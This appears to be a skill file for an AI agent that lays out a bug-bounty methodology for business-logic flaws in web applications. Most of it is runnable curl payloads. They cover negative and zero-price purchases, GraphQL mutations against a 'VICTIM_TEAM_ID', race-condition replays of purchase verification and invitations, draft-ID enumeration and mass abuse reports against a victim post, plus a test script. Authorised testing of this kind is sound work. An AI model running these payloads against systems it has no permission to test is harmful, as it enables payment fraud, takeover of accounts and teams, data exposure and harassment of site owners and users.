---
description: Find BIZLOGIC vulnerabilities in web applications. Use when testing for BIZLOGIC issues.
---

# BIZLOGIC Vulnerability Testing Framework

## High-Value Patterns from Real Reports

### Critical Endpoint Patterns
- `/api/v*/prime/subscription` - subscription status checks
- `/graphql` - GraphQL mutations for privileges
- `/ajax/accept_*` - acceptance/claiming operations
- `/**/verify_purchase` - payment verification
- `/export*` - data export functions
- `/**/drip` - rate accumulation (financial)
- `/kyc*` - KYC/verification processes
- `/**/invite*` - invitation systems
- `/**/join*` - joining/membership operations

### Parameter Names to Target
```bash
# Subscription/Payment Parameters
is_active|is_pro|subscription_status|payment_status|amount|amount_in|amount_out|price

# ID Parameters  
team_id|user_id|transaction_id|order_id|job_id|product_id|session_id

# Boolean Flags
is_verified|verified|active|enabled|premium|pro|paid|claimed

# Quantities/Limits
quantity|count|seats|tickets|limit|max_users|rate|fee
```

### Headers to Manipulate
```bash
X-Auth-Token|Authorization|X-User-ID|X-Team-ID|Content-Type|X-Requested-With
```

## Step-by-Step Testing Methodology

### Phase 1: Reconnaissance
```bash
# Find GraphQL endpoints
curl -s "$TARGET" | grep -E "(graphql|\/api\/)" 

# Discover API endpoints
curl -s "$TARGET/sitemap.xml" | grep -oE "https?://[^<]+" | grep -E "(api|ajax|graphql)"

# Check for subscription/premium endpoints
curl -s -k "$TARGET" | grep -oE "\/[^\"]*(?:premium|subscription|prime|pro)" | head -20
```

### Phase 2: Response Manipulation Testing
```bash
# Test subscription bypass via response manipulation
curl -s -X GET "$TARGET/api/v1/user/subscription" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" | \
  sed 's/"is_active":false/"is_active":true/g' | \
  sed 's/"is_pro":false/"is_pro":true/g'

# Test boolean flag manipulation in responses
curl -s -X GET "$TARGET/api/user/status" \
  -H "Authorization: Bearer $TOKEN" | \
  sed 's/false/true/g'
```

### Phase 3: Payment/Pricing Logic Testing
```bash
# Test negative amounts
curl -X POST "$TARGET/api/checkout" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"amount": -10.00, "item_id": "123"}'

# Test zero amounts
curl -X POST "$TARGET/api/purchase" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"price": 0, "quantity": 999, "product_id": "456"}'

# Test amount manipulation
curl -X POST "$TARGET/api/payment" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"amount_in": 1.00, "amount_out": 100.00, "amount": 1.00}'
```

### Phase 4: GraphQL Privilege Escalation
```bash
# Test bounty table creation bypass
curl -X POST "$TARGET/graphql" \
  -H "Content-Type: application/json" \
  -H "X-Auth-Token: $TOKEN" \
  -d '{
    "query": "mutation($input: UpdateBountyTableInput!) { 
      updateBountyTable(input: $input) { 
        was_successful 
      } 
    }",
    "variables": {
      "input": {
        "team_id": "TARGET_TEAM_ID_BASE64",
        "bounty_table_rows": [{"low": 100, "medium": 250}]
      }
    }
  }'

# Test team/organization manipulation
curl -X POST "$TARGET/graphql" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "query": "mutation($input: ClaimCredentialInput!) { 
      claimCredential(input: $input) { 
        was_successful 
      } 
    }",
    "variables": {
      "input": {
        "team_id": "VICTIM_TEAM_ID",
        "clientMutationId": "1"
      }
    }
  }'
```

### Phase 5: Race Condition Testing
```bash
# Test concurrent credential claiming
for i in {1..10}; do
  curl -X POST "$TARGET/api/claim_credentials" \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"team_id": "123", "credential_id": "456"}' &
done
wait

# Test concurrent purchase verification
TRANSACTION_ID="GPA.1234-5678-9012-34567"
for i in {1..20}; do
  curl -X POST "$TARGET/api/verify_purchase" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Authorization: Bearer $TOKEN" \
    -d "transaction_id=$TRANSACTION_ID&token=$PURCHASE_TOKEN" &
done
wait

# Test parallel invitation acceptance
INVITE_TOKEN="abc123def456"
for i in {1..5}; do
  curl -X POST "$TARGET/group/post_join" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "invite=$INVITE_TOKEN&csrf=$CSRF_TOKEN" &
done
wait
```

### Phase 6: ID Manipulation & Export Testing
```bash
# Test draft access via export
curl -X GET "$TARGET/export_reports" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json"

# Test sequential ID enumeration for drafts
for id in {100000..100100}; do
  curl -s -X GET "$TARGET/jobs/view/$id" \
    -H "Authorization: Bearer $TOKEN" | \
    grep -q "draft\|private" && echo "Draft found: $id"
done

# Test numeric ID manipulation
curl -X POST "$TARGET/lite/flag-content" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Authorization: Bearer $TOKEN" \
  -d "contentUrn=urn:li:jobPosting:DRAFT_ID&reason=SPAM_CONTENT"
```

### Phase 7: Rate Limit & Business Logic Bypass
```bash
# Test report abuse without rate limiting
VICTIM_POST_ID="789"
for i in {1..50}; do
  curl -X POST "$TARGET/api/report_abuse" \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"post_id": "'$VICTIM_POST_ID'", "reason": "spam"}' &
done
wait

# Test unlimited ticket booking
curl -X POST "$TARGET/checkout" \
  -H "Content-Type: application/multipart/form-data" \
  -H "Authorization: Bearer $TOKEN" \
  -F "addon-268-number-of-seats-0=999-seats-999"

# Test invitation reuse
curl -X POST "$TARGET/team/accept_invite" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"invitation_token": "REUSABLE_TOKEN"}'
```

## Severity Rating Table

| Impact | Criteria | Example |
|--------|----------|---------|
| **Critical** | Financial loss, unlimited resource access | Free premium subscriptions, unlimited coin generation |
| **High** | Privilege escalation, significant business impact | Team takeover, draft data disclosure |
| **Medium** | Limited financial impact, privacy breach | Fee bypass, internal descriptions leaked |
| **Low** | Minor business logic flaws | Rate limit bypass, cosmetic privilege display |

## False Positives to Ignore

- Client-side only subscription checks without server validation
- Cosmetic UI changes that don't affect backend state
- Expected GraphQL error messages for unauthorized operations
- Cached responses showing old privilege states
- Test/sandbox environment limitations by design

## Finding Report Template

```markdown
## Summary
[Brief description of the business logic flaw]

## Vulnerable Endpoint
`[METHOD] [URL]`

## Request/Response
```http
[Include actual HTTP request/response]
```

## Steps to Reproduce
1. [Step 1]
2. [Step 2] 
3. [Step 3]

## Impact
[Business impact description]

## Proof of Concept
[Screenshots/evidence]

## Recommended Fix
[Suggested remediation]
```

## Quick Test Script
```bash
#!/bin/bash
TARGET="$1"
TOKEN="$2"

echo "Testing business logic vulnerabilities on $TARGET"

# Test 1: Response manipulation
echo "Testing subscription status bypass..."
curl -s "$TARGET/api/user/subscription" -H "Authorization: Bearer $TOKEN"

# Test 2: Payment logic
echo "Testing zero amount purchase..."
curl -X POST "$TARGET/api/purchase" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"amount": 0, "quantity": 1}'

# Test 3: Race conditions
echo "Testing race condition in claiming..."
for i in {1..5}; do
  curl -X POST "$TARGET/api/claim" \
    -H "Authorization: Bearer $TOKEN" &
done
wait

echo "Business logic testing complete"
```